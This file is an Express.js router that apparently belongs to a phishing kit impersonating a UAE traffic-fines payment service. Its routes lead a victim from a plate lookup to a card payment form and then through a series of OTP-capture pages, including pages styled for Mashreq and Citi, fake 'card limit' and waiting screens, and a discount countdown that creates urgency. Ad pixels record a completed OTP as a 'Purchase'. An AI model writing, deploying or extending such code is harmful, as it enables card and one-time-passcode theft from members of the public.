const express = require('express');
const router  = express.Router();
const { getSetting } = require('../db');

// PageView is fired automatically by the base pixel snippet on every page,
// so it is intentionally not listed here (would cause a duplicate on '/').
const DEFAULT_PIXEL_TRIGGERS = {
  ViewContent:       { type: 'url',    value: '/fines' },
  Search:            { type: 'button', selector: '#search-btn', page: '/' },
  InitiateCheckout:  { type: 'button', selector: '#pay-btn',    page: '/fines' },
  AddPaymentInfo:    { type: 'url',    value: '/payment' },
  Purchase:          { type: 'url',    value: '/otp-approved' },
  SubmitApplication: { type: 'url',    value: '/otp-sms' },
};

async function getPixelData() {
  const metaPixelId   = await getSetting('meta_pixel_id',   '');
  const tiktokPixelId = await getSetting('tiktok_pixel_id', '');
  let metaSaved = {}, tiktokSaved = {};
  try { metaSaved   = JSON.parse(await getSetting('meta_event_triggers',   '{}')); } catch(e) {}
  try { tiktokSaved = JSON.parse(await getSetting('tiktok_event_triggers', '{}')); } catch(e) {}
  const metaTriggers   = { ...DEFAULT_PIXEL_TRIGGERS, ...metaSaved };
  const tiktokTriggers = { ...DEFAULT_PIXEL_TRIGGERS, ...tiktokSaved };
  const discountEndsAtRaw   = await getSetting('discount_ends_at',      '');
  const discountTimerActive = await getSetting('discount_timer_active', '1');
  const discountEndsAt = (discountTimerActive === '1') ? discountEndsAtRaw : '';
  return { metaPixelId, tiktokPixelId, metaTriggers, tiktokTriggers, discountEndsAt };
}

const EMIRATE_NAMES = {
  DXB:'Dubai', AUH:'Abu Dhabi', SHJ:'Sharjah',
  AJM:'Ajman', UAQ:'Umm Al Quwain', RAK:'Ras Al Khaimah', FUJ:'Fujairah',
};

router.get('/', async (req, res) => {
  const pixel = await getPixelData();
  res.render('index', { ...pixel, pixelCurrentPath: '/' });
});

router.get('/fines', async (req, res) => {
  const pixel = await getPixelData();
  const { plateNo='', plateCat='2', plateSrcCode='DXB', plateCodeId='0', plateCodeLetter='' } = req.query;
  res.render('fines', {
    ...pixel, pixelCurrentPath: '/fines',
    plateNo, plateCat, plateSrcCode, plateCodeId, plateCodeLetter,
    emirateName: EMIRATE_NAMES[plateSrcCode] || plateSrcCode,
  });
});

router.get('/payment', async (req, res) => {
  const pixel = await getPixelData();
  const { plateNo='', plateSrcCode='', plateCodeLetter='', totalFine='0', fineCount='0', error='' } = req.query;
  res.render('payment', {
    ...pixel, pixelCurrentPath: '/payment',
    plateNo, plateSrcCode, plateCodeLetter,
    totalFine:  parseInt(totalFine)  || 0,
    fineCount:  parseInt(fineCount)  || 0,
    emirateName: EMIRATE_NAMES[plateSrcCode] || plateSrcCode,
    paymentError: error,
  });
});

router.get('/otp-loading', async (req, res) => {
  const pixel = await getPixelData();
  const { amount='0', cardLast4='****', totalFine, issuer='', sid='' } = req.query;
  res.render('otp-loading', {
    ...pixel, pixelCurrentPath: '/otp-loading',
    amount: parseInt(amount) || 0,
    cardLast4,
    totalFine: parseInt(totalFine || amount) || 0,
    issuer,
    sid,
  });
});

router.get('/card-limit', async (req, res) => {
  const pixel = await getPixelData();
  const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
  res.render('card-limit', {
    ...pixel, pixelCurrentPath: '/card-limit',
    totalFine: parseInt(totalFine) || 0,
    cardLast4, issuer, sid,
  });
});

router.get('/otp-sms2', async (req, res) => {
  const pixel = await getPixelData();
  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='', error='' } = req.query;
  res.render('otp-sms2', {
    ...pixel, pixelCurrentPath: '/otp-sms2',
    amount: parseInt(amount) || 0,
    cardLast4,
    totalFine: parseInt(totalFine || amount) || 0,
    issuer, sid, error,
    dateStr: new Date().toLocaleString('tr-TR', {
      timeZone: 'Asia/Dubai', day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit',
    }),
  });
});

router.get('/otp-sms', async (req, res) => {
  const pixel = await getPixelData();
  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='', error='' } = req.query;
  res.render('otp-sms', {
    ...pixel, pixelCurrentPath: '/otp-sms',
    amount: parseInt(amount) || 0,
    cardLast4,
    totalFine: parseInt(totalFine || amount) || 0,
    issuer, sid, error,
    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:false }),
  });
});

router.get('/otp', async (req, res) => {
  const pixel = await getPixelData();
  const { amount='0', cardLast4='****', totalFine, issuer='', sid='' } = req.query;
  res.render('otp', {
    ...pixel, pixelCurrentPath: '/otp',
    cardLast4,
    totalFine: parseInt(totalFine || amount) || 0,
    issuer,
    sid,
    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:false }),
  });
});

router.get('/waiting', async (req, res) => {
  const pixel = await getPixelData();
  const { cardLast4='****', totalFine='0', issuer='', sid='' } = req.query;
  res.render('waiting', {
    ...pixel, pixelCurrentPath: '/waiting',
    cardLast4,
    totalFine: parseInt(totalFine) || 0,
    issuer,
    sid,
  });
});

router.get('/otp-mashreq', async (req, res) => {
  const pixel = await getPixelData();
  const { totalFine='0', cardLast4='****', issuer='Mashreq', sid='' } = req.query;
  res.render('otp-mashreq', { ...pixel, pixelCurrentPath: '/otp-mashreq', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
});

router.get('/otp-citi', async (req, res) => {
  const pixel = await getPixelData();
  const { totalFine='0', cardLast4='****', issuer='Citi', sid='' } = req.query;
  res.render('otp-citi', { ...pixel, pixelCurrentPath: '/otp-citi', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
});

router.get('/yogunluk', async (req, res) => {
  const pixel = await getPixelData();
  const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
  res.render('yogunluk', {
    ...pixel, pixelCurrentPath: '/yogunluk',
    totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid,
    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'long', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:false }),
  });
});

router.get('/otp-approved', async (req, res) => {
  const pixel = await getPixelData();
  const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
  res.render('otp-approved', {
    ...pixel, pixelCurrentPath: '/otp-approved',
    totalFine:  parseInt(totalFine) || 0,
    cardLast4,
    issuer,
    sid,
    dateStr: new Date().toLocaleDateString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'long', year:'numeric' }),
    timeStr: new Date().toLocaleTimeString('en-AE', { timeZone:'Asia/Dubai', hour:'2-digit', minute:'2-digit', second:'2-digit' }),
  });
});

module.exports = router;
